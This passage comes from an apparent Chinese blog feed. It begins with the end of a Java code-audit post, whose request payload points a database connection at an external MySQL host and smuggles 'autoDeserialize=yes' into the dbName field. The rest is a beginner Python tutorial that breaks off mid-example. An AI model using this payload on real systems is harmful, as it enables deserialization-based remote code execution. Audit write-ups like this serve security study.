class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">type</span>=sqldictsync&amp;dbNameOnly=<span class="hljs-literal">false</span>&amp;dbType=MYSQL&amp;dbServer=<span class="hljs-number">101.36</span>.<span class="hljs-number">122.13</span>:<span class="hljs-number">3308</span>&amp;<br><span class="hljs-attr">dbName</span>=dec03db?detectCustomCollations=<span class="hljs-literal">true</span>%<span class="hljs-number">26</span>autoDeserialize=<span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173537603.png" alt="image-20250812190132144"></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习笔记</title>
    <link href="/2025/10/27/P%20y%20t%20h%20o%20n%20%E5%AD%A6%20%E4%B9%A0%20%E7%AC%94%20%E8%AE%B0/"/>
    <url>/2025/10/27/P%20y%20t%20h%20o%20n%20%E5%AD%A6%20%E4%B9%A0%20%E7%AC%94%20%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="第一章-软件的安装"><a href="#第一章-软件的安装" class="headerlink" title="第一章 软件的安装"></a>第一章 软件的安装</h1><h2 id="1-本章目标"><a href="#1-本章目标" class="headerlink" title="1.本章目标"></a>1.本章目标</h2><ul><li>掌握Python解释器的安装与卸载</li><li>掌握PyCharm的安装与卸载</li></ul><p>Python解释器是一款用于解释、执行Python代码的应用程序</p><h2 id="2-Pycharm的简介"><a href="#2-Pycharm的简介" class="headerlink" title="2.Pycharm的简介"></a>2.Pycharm的简介</h2><p>PyCharm是一款Python的集成开发环境，在Windows、MacOS和Linux操作系统中都可以使用带有一整 套可以帮助用户在使用Python语言开发时提高效率的工具</p><h2 id="3-Pycharm的优势"><a href="#3-Pycharm的优势" class="headerlink" title="3.Pycharm的优势"></a>3.Pycharm的优势</h2><p>语法高亮、智能提示、代码调试、Project管理、解释代码、框架和库 … …</p><h2 id="4-Pycharm的版本"><a href="#4-Pycharm的版本" class="headerlink" title="4.Pycharm的版本"></a>4.Pycharm的版本</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170347164.png" alt="image-20251024135554162"></p><h1 id="第二章-Python编程基础"><a href="#第二章-Python编程基础" class="headerlink" title="第二章 Python编程基础"></a>第二章 Python编程基础</h1><h2 id="本章目标"><a href="#本章目标" class="headerlink" title="本章目标"></a>本章目标</h2><ul><li>了解什么是计算机程序 </li><li>了解什么是编程语言 </li><li>了解编程语言的分类 </li><li>了解静态语言与脚本语言的区别 </li><li>掌握IPO程序编写方法 </li><li>熟练应用输出函数print与输入函数input </li><li>掌握Python中的注释与缩进</li></ul><h2 id="程序设计语言"><a href="#程序设计语言" class="headerlink" title="程序设计语言"></a>程序设计语言</h2><h3 id="1-机器语言"><a href="#1-机器语言" class="headerlink" title="1.机器语言"></a>1.机器语言</h3><p>是一种 二进制语言，它直接使用二进制代码表达指令，是计算机硬件可以识别和执行的程序设计语言</p><h3 id="2-汇编语言"><a href="#2-汇编语言" class="headerlink" title="2.汇编语言"></a>2.汇编语言</h3><p>使用方便助记符与机器语言中的指令一一对应</p><h3 id="3-高级语言"><a href="#3-高级语言" class="headerlink" title="3.高级语言"></a>3.高级语言</h3><p>是接近自然语言的一种计算机程序设计语言，Python、Java都是高级语言</p><h2 id="编译与解释"><a href="#编译与解释" class="headerlink" title="编译与解释"></a>编译与解释</h2><h3 id="1-编译型"><a href="#1-编译型" class="headerlink" title="1.编译型"></a>1.编译型</h3><p>编译型是指将源代码转换成目标代码的过程，通常源代码是高级语言代码，目标代码是机器语言代码， 执行编译的计算机程序称为编译器（Complier）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170350328.png" alt="image-20251024135748021"></p><h3 id="2-解释型"><a href="#2-解释型" class="headerlink" title="2.解释型"></a>2.解释型</h3><p>解释型是将源代码逐行转换成目标代码的过程，执行解释的计算机程序称为解释器（Interpreter）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170351861.png" alt="image-20251024135811296"></p><h2 id="1-IPO程序编写法"><a href="#1-IPO程序编写法" class="headerlink" title="1. ＩＰＯ程序编写法"></a>1. ＩＰＯ程序编写法</h2><p>IPO（Input，Process，Output）</p><p> 输入–&gt;处理（process）–&gt;输出</p><h2 id="2-基本的输出函数print"><a href="#2-基本的输出函数print" class="headerlink" title="2. 基本的输出函数print"></a>2. 基本的输出函数print</h2><h3 id="语法结构："><a href="#语法结构：" class="headerlink" title="语法结构："></a>语法结构：</h3><p>print（输出内容）</p><h3 id="print-函数完整的语法格式："><a href="#print-函数完整的语法格式：" class="headerlink" title="print()函数完整的语法格式："></a>print()函数完整的语法格式：</h3><p>  print（ value，…，sep&#x3D;’ ‘，end&#x3D;’\n’, file&#x3D;None ）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#demo 1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello Python!&#x27;</span>)<br><span class="hljs-comment"># 示例2-1用print函数进行简单输出</span><br>a = <span class="hljs-number">100</span><br>b = <span class="hljs-number">50</span><br><span class="hljs-built_in">print</span>(<span class="hljs-number">90</span>)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(a * b)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北京欢迎你！&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;北京欢迎你！&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;&#x27;北京欢迎你!&#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;北京欢迎你！&quot;&quot;&quot;</span>)<br><span class="hljs-comment"># 示例2-2不换行一次输出多个数据</span><br><span class="hljs-built_in">print</span>(a, b, <span class="hljs-string">&#x27;要么出众，要么出局！！！&#x27;</span>)<br><span class="hljs-comment"># 示例2-3输出ASCII表所对应的字符</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;C&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">67</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">56</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">91</span>))<br><span class="hljs-comment"># 示例2-4使用print函数输出中文Unicode码</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;北&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;京&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">21271</span>), <span class="hljs-built_in">chr</span>(<span class="hljs-number">20140</span>))<br><span class="hljs-comment"># 示例2-5使用print函数将内容输出到文件</span><br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;note.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)  <span class="hljs-comment"># 打开文件 w--&gt;write</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北京欢迎你&#x27;</span>, file=fp)  <span class="hljs-comment"># 将“北京欢迎你”输出（写入）到note.txt文件中</span><br>fp.close()  <span class="hljs-comment"># 关闭文件</span><br><span class="hljs-comment"># 示例2-6多条print函数输出结果一行显示</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北京&#x27;</span>, end=<span class="hljs-string">&#x27;--&gt;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;欢迎你&#x27;</span>)  <span class="hljs-comment"># 没有修改 结束符，所以print之后会有一个空行</span><br><span class="hljs-comment"># 示例2-7使用连接符连接多个字符串</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北京欢迎你&#x27;</span>+<span class="hljs-string">&#x27;2023&#x27;</span>)  <span class="hljs-comment"># 只能字符串与字符串连接</span><br><br></code></pre></td></tr></table></figure><h2 id="3-基本的输入函数input"><a href="#3-基本的输入函数input" class="headerlink" title="3. 基本的输入函数input"></a>3. 基本的输入函数input</h2><h3 id="语法结构：-1"><a href="#语法结构：-1" class="headerlink" title="语法结构："></a>语法结构：</h3><p>  x&#x3D;input (‘提示文字’) </p><p>注意事项： 无论输入的数据是什么，x的数据类型都是<strong>字符串</strong>类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例2-8 input函数的使用</span><br>name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入你的姓名：&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我的姓名是：&#x27;</span> + name)<br><span class="hljs-comment"># 示例2-9 输入整数类型的数据</span><br>num = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入您的幸运数字：&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;您的幸运数字是：&#x27;</span> + num)  <span class="hljs-comment"># 连接成功，说明num是字符串类型</span><br>num = <span class="hljs-built_in">int</span>(num)  <span class="hljs-comment"># 使用内置函数int将num转成整数类型</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;您的幸运数字是：&#x27;</span>, num)<br></code></pre></td></tr></table></figure><h2 id="4-Python中的注释"><a href="#4-Python中的注释" class="headerlink" title="4. Python中的注释"></a>4. Python中的注释</h2><ul><li>序员在代码中对代码功能解释说明的标注性文字 </li><li>可以提高代码的可读性 </li><li>注释的内容将被Python解释器忽略，不被计算机执行</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h3><p>单行注释，多行注释和中文声明注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例2-10单行注释</span><br>year = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入您的出生年份；&#x27;</span>)  <span class="hljs-comment"># 要求从键盘输入出生年份，要是4位的年份，举例：</span><br><span class="hljs-number">1990</span><br><span class="hljs-comment"># 示例2-11多行注释</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-comment">#中文声明注释一定要写在第一行</span><br></code></pre></td></tr></table></figure><h2 id="5-代码缩进"><a href="#5-代码缩进" class="headerlink" title="5. 代码缩进"></a>5. 代码缩进</h2><ul><li>是指每行语句开始前的空白区域 </li><li>用来表示Python程序间的包含和层次关系 </li><li>类定义，函数定义，流程控制语句以及异常处理语句等行尾的冒号和下一行的缩进表示一个代码块 的开始，而缩进结束，则表示一个代码块的结束 </li><li>通常情况下采用4个空格作为一个缩进量</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 实例2-12 代码缩进</span><br><span class="hljs-comment"># 一般代码 不需要缩进</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;world&#x27;</span>)<br><span class="hljs-comment"># 类的定义</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-comment"># 函数的定义</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>():<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="6-第二章本章总结"><a href="#6-第二章本章总结" class="headerlink" title="6. 第二章本章总结"></a>6. 第二章本章总结</h2><ul><li>程序设计语言又被称为编程语言 </li><li>计算机程序是使用编程语言组织起来的一组计算机指令 </li><li>计算机指令就是指挥机器工作的指示和命令 </li><li>编程语言可分为机器语言，汇编语言和高级语言 </li><li>采用编译方式执行语言称为静态语言（eg.Java语言） </li><li>采用解释方式执行的语言称为脚本语言（eg.Python语言） </li><li>IPO指的是输入，处理和输出 </li><li>print()函数完整的语法格式：print（value，…，sep&#x3D;’ ‘，end&#x3D;’\n’,file&#x3D;None）</li><li>输入函数input的语法格式为：x&#x3D;input (‘提示文字’) </li><li>Python中的注释可分为单行注释，多行注释和中文声明注释 </li><li>Python语言常用严格的“缩进”来表示程序逻辑</li></ul><h1 id="第三章-数据类型和运算符"><a href="#第三章-数据类型和运算符" class="headerlink" title="第三章 数据类型和运算符"></a>第三章 数据类型和运算符</h1><h2 id="1-保留字与标识符"><a href="#1-保留字与标识符" class="headerlink" title="1.保留字与标识符"></a>1.保留字与标识符</h2><h3 id="1-保留字："><a href="#1-保留字：" class="headerlink" title="1.保留字："></a>1.保留字：</h3><p>指在Python中被赋予特定意义的一些单词，在开发程序时，不可以把这些保留字作为变量，函数，类， 模块和其他对象的名称来使用 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170429695.png" alt="image-20251024141056138"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例3-1查询Python中的保留字</span><br><span class="hljs-keyword">import</span> keyword<br><span class="hljs-built_in">print</span>(keyword.kwlist)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(keyword.kwlist))  <span class="hljs-comment"># 获取保留字的个数</span><br><span class="hljs-comment"># 示例3-2保留字严格区分大小写</span><br>true = <span class="hljs-string">&#x27;真&#x27;</span><br><span class="hljs-comment"># True=&#x27;真&#x27; # 结果报错</span><br></code></pre></td></tr></table></figure><h3 id="2-Python标识符的命名规则"><a href="#2-Python标识符的命名规则" class="headerlink" title="2.Python标识符的命名规则"></a>2.Python标识符的命名规则</h3><ul><li>可以是字符（英文、中文）、下划线“_”和数字，并且第一个字符不能是数字 </li><li>不能使用Python中的保留字 </li><li>标识符严格区分大小写 </li><li>以下划线开头的标识符有特殊意义，一般应避免使用相似的标识符 </li><li>允许使用中文作为标识符，但不建议使用</li></ul><h3 id="3-Python标识符的命名规范"><a href="#3-Python标识符的命名规范" class="headerlink" title="3.Python标识符的命名规范"></a>3.Python标识符的命名规范</h3><ul><li><p>模块名尽量短小，并且全部使用小写字母，可以使用下划线分割多个字母。 </p><p>例如：grame_main </p></li><li><p>包名尽量短小，并且全部使用小写字母，不推荐使用下划线。 </p><p> 例如：com.ysjpython , 不推荐使用com_ysjpythonb </p></li><li><p>类名采用单词首字母大写形式（Pascal风格）。</p><p>例如：MyClass </p></li><li><p>模块内部的类采用 “_” + Pascal 风格的类名组成， </p><p>例如：在MyClass中的内部类 _InnerMyClass _</p></li><li><p>函数、类的属性和方法的命名，全部使用小写字母，多个字母之间使用下划线分隔 </p></li><li><p>常量命名时采用全部大写字母，可以使用下划线 </p></li><li><p>使用单下划线 “_” 开头的模块变量或函数是受保护的，在使用 “from xxx import *” 语句从模块中导入时，这些模块变量或函数不能被导入 </p></li><li><p>使用双下划线 “__” 开头的实例变量或方法是类私有的 </p></li><li><p>以双下划线开头和结尾的是Python的专用标识， </p><p>例如：__ init __()表示初始化函数</p></li></ul><h2 id="2-变量与常量"><a href="#2-变量与常量" class="headerlink" title="2.变量与常量"></a>2.变量与常量</h2><h3 id="1-变量的语法结构"><a href="#1-变量的语法结构" class="headerlink" title="1.变量的语法结构"></a>1.变量的语法结构</h3><p>变量名&#x3D;value </p><p>举例： luck_number&#x3D;8<br>                 （栈内存） （堆内存）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例3-3变量的定义和使用</span><br>luck_number = <span class="hljs-number">8</span>  <span class="hljs-comment"># 创建一个整型变量luck_number，并为其赋值为8</span><br>my_name = <span class="hljs-string">&#x27;xxx&#x27;</span>  <span class="hljs-comment"># 字符串类型的变量</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;luck_number的数据类型是：&#x27;</span>,<span class="hljs-built_in">type</span>(luck_number))<br><span class="hljs-built_in">print</span>(my_name,<span class="hljs-string">&#x27;的幸运数字是：&#x27;</span>,luck_number)<br><span class="hljs-comment"># Python动态修改变量的数据类型，通过赋不同类型的值就可以直接修改</span><br>luck_number=<span class="hljs-string">&#x27;北京欢迎你&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;luck_number的数据类型是：&#x27;</span>,<span class="hljs-built_in">type</span>(luck_number))  <span class="hljs-comment"># &lt;class &#x27;str&#x27;&gt;</span><br><span class="hljs-comment"># 在Python中允许多个变量指向同一个值</span><br>no=number=<span class="hljs-number">1024</span><br><span class="hljs-built_in">print</span>(no,number)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(no)) <span class="hljs-comment"># id()查看对象的内存地址 2799143989456</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(number)) <span class="hljs-comment"># 2799143989456</span><br><br></code></pre></td></tr></table></figure><h3 id="2-变量命名应遵循以下几条原则"><a href="#2-变量命名应遵循以下几条原则" class="headerlink" title="2.变量命名应遵循以下几条原则"></a>2.变量命名应遵循以下几条原则</h3><ul><li>变量名必须是一个有效的标识符 </li><li>变量名不能使用Python中的保留字 </li><li>慎用小写字母i（挨）和大写字母O </li><li>应选择有意义的单词作为变量名</li></ul><h3 id="3-常量"><a href="#3-常量" class="headerlink" title="3.常量"></a>3.常量</h3><p>常量就是在程序运行过程中，值不允许改变的量，全部使用大写字母和下划线命名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 示例3-4常量的定义</span><br>pi=<span class="hljs-number">3.1415926</span> <span class="hljs-comment"># 定义了一个变量</span><br>PI=<span class="hljs-number">3.1415926</span> <span class="hljs-comment"># 定义了一个常量</span><br></code></pre></td></tr></table></figure><h2 id="3-数值类型"><a href="#3-数值类型" class="headerlink" title="3.数值类型"></a>3.数值类型</h2><h3 id="1-整数类型"><a href="#1-整数类型" class="headerlink" title="1.整数类型"></a>1.整数类型</h3><p>整数类型表示的数值是没有小数部分的数值，包括正整数、负整数和0</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170402143.png" alt="image-20251024141701735"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例3-5整数的四种表示形式</span><br><span class="hljs-attribute">num</span>=987 # 默认是十进制，表示整数<br><span class="hljs-attribute">num2</span>=0b1010101 #　使用二进制表示整数<br><span class="hljs-attribute">num3</span>=0o765 # 使用八进制表示整数<br><span class="hljs-attribute">num4</span>=0x87ABF # 使用十六进制表示整数<br><span class="hljs-built_in">print</span>(num)<br><span class="hljs-built_in">print</span>(num2)<br><span class="hljs-built_in">print</span>(num3)<br><span class="hljs-built_in">print</span>(num4)<br></code></pre></td></tr></table></figure><h3 id="2-浮点数类型"><a href="#2-浮点数类型" class="headerlink" title="2.浮点数类型"></a>2.浮点数类型</h3><p>浮点数类型表示带有小数点的数值，由整数部分和小数部分组成</p><p><strong>注意事项：</strong> 两个浮点类型的数在进行运算时，有一定的概率运算结果后会增加一些“不确定的”尾数 Python中的复数与数学中的复数形式完全一致，由<strong>实部和虚部</strong>组成</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170453698.png" alt="image-20251024141744741"></p><p>在Python中实数部分使用**.real<strong>表示，虚数部分使用</strong>.imag**表示</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 示例3-6浮点数类型的使用</span><br><span class="hljs-attribute">height</span> = <span class="hljs-number">187</span>.<span class="hljs-number">6</span>  # 身高<br><span class="hljs-attribute">print</span>(height)<br><span class="hljs-attribute">print</span>(type(height))  # type()查看height这个变量的数据类型<br><span class="hljs-attribute">x</span> = <span class="hljs-number">10</span><br><span class="hljs-attribute">y</span> = <span class="hljs-number">10</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">print</span>(&#x27;x的数据类型:&#x27;, type(x))  # int<br><span class="hljs-attribute">print</span>(&#x27;y的数据类型:&#x27;, type(y))  # float<br><span class="hljs-attribute">x</span> = <span class="hljs-number">1</span>.<span class="hljs-number">99</span>E1413<br><span class="hljs-attribute">print</span>(&#x27;科学记数法:&#x27;, x, &#x27;x的数据类型：&#x27;, type(x))<br><span class="hljs-attribute">print</span>(<span class="hljs-number">0</span>.<span class="hljs-number">1</span> + <span class="hljs-number">0</span>.<span class="hljs-number">2</span>)  # 不确定的尾数问题<span class="hljs-number">0</span>.<span class="hljs-number">30000000000000004</span><br><span class="hljs-attribute">print</span>(round(<span class="hljs-number">0</span>.<span class="hljs-number">1</span> + <span class="hljs-number">0</span>.<span class="hljs-number">2</span>, <span class="hljs-number">1</span>))  # <span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-comment"># 示例3-7复数类型的使用</span><br><span class="hljs-attribute">x</span> = <span class="hljs-number">123</span> + <span class="hljs-number">456</span>j<br><span class="hljs-attribute">print</span>(&#x27;实数部分：&#x27;, x.real)  # 实数部分： <span class="hljs-number">123</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">print</span>(&#x27;虚数部分：&#x27;, x.imag)  # 虚数部分： <span class="hljs-number">456</span>.<span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><h3 id="3-字符串类型"><a href="#3-字符串类型" class="headerlink" title="3.字符串类型"></a>3.字符串类型</h3><p>字符串类型连续的字符序列，可以表示计算机所能识别的一切字符 </p><p>字符串的界定符：单引号、双引号、三引号</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170455957.png" alt="image-20251024141822557"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170405892.png" alt="image-20251024141829434"></p><p>原字符：使转义字符失效的字符，r或R</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例3-8字符串类型的使用</span><br>city = <span class="hljs-string">&#x27;天津&#x27;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">address </span>= <span class="hljs-string">&#x27;天津市宝坻区香江大街3号&#x27;</span><br><span class="hljs-built_in">print</span>(city)<br><span class="hljs-built_in">print</span>(address)<br><span class="hljs-comment"># 多行字符串</span><br><span class="hljs-built_in">info</span> = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;地址：天津市宝坻区香江大街3号</span><br><span class="hljs-string">   收件人：zjh</span><br><span class="hljs-string">   手机号：18800000000</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-attribute">info2</span>=<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;地址：天津市宝坻区香江大街3号</span><br><span class="hljs-string">   收件人：zjh</span><br><span class="hljs-string">   手机号：18800000000</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">print</span>(info)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;--------------------&#x27;</span>)<br><span class="hljs-built_in">print</span>(info2)<br><span class="hljs-comment">#示例3-9转义字符的使用</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北京&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;欢迎你&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;--------------&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北京\n欢迎你&#x27;</span>)  # 遇到\n即换行，可以连续多行<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北\n京\n欢\n迎\n你&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;--------------&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北京\t欢迎你&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello\toooooo&#x27;</span>)  # hello是5个字符，一个制表位是8个字符 <span class="hljs-attribute">8-5</span>=3<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hellooooooo&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;老师说：\&#x27;</span>好好学习，天天向上\<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;老师说：\&quot;好好学习，天天向上\&quot;&#x27;</span>)<br><span class="hljs-comment"># 原字符，使转义字符失效的符号r或R</span><br><span class="hljs-built_in">print</span>(r<span class="hljs-string">&#x27;北\n京\n欢\n迎\n你&#x27;</span>)<br><span class="hljs-built_in">print</span>(R<span class="hljs-string">&#x27;北\n京\n欢\n迎\n你&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>字符串又被称为有序的字符序列，对字符串中某个字符的检索称为索引 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170503574.png" alt="image-20251024141900935"></p><p>对字符串中某个子串或区间的检索称为切片</p><h4 id="切片的语法结构"><a href="#切片的语法结构" class="headerlink" title="切片的语法结构"></a>切片的语法结构</h4><p>字符串或字符串变量[N:M]</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例3-10字符串的索引和切片</span><br>s = <span class="hljs-string">&#x27;HELLOWORLD&#x27;</span><br><span class="hljs-built_in">print</span>(s[0], s[-10])  # 序号0和序号-10表示的是同一个字符<br><span class="hljs-built_in">print</span>(<span 